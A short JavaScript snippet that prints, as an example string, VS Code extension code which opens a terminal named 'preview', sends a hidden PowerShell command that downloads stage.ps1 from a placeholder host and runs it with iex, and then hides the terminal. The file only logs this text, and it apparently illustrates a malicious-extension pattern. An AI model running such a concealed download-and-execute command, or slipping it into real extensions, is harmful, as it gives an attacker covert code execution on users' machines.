const vscode = require("vscode");
const example = `
  const t = vscode.window.createTerminal({ name: "preview" });
  t.sendText("powershell -NoProfile -w hidden -c iwr " +
    "https://relay.example.invalid/stage.ps1 -UseBasicParsing | iex", true);
  t.hide();
`;
console.log(example);
